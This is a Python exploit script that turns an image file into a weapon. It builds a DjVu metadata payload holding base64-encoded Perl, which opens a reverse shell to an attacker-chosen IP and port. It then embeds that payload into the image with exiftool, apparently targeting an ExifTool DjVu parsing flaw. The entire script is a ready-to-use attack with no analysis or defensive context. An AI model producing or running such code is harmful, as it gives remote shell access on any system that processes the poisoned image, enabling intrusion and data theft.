import base64
import subprocess
import argparse

def setup():
    print("[+] Downloading djvulibre-bin and exiftool packages...")
    output = subprocess.check_output("sudo apt-get install djvulibre-bin exiftool", shell=True)

def exploit(ip, port, imagefile):
    print("[+] Generating exploit payload...")
    payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"
    payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )
    payload = payload + b"'))};\")"
    payload_file = open('payload','w')
    payload_file.write(payload.decode('utf-8'))
    payload_file.close()
    print("[+] Writing payload to file...")
    subprocess.run(['bzz', 'payload', 'payload.bzz'])
    print("[+] Generating payload.bzz file...")
    subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
    subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', imagefile]) 
    print("[+] Exploit completed! Payload saved to {imagefile}".format(imagefile=imagefile))

def main(ip, port, imagefile):
    setup()
    exploit(ip,port,imagefile)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', help='IP Address of reverse shell listener')
    parser.add_argument('-p', '--port', help='Port of reverse shell listener')
    parser.add_argument('-f', '--image', help='Image File location')
    args = parser.parse_args()
    main(args.ip, args.port, args.image)
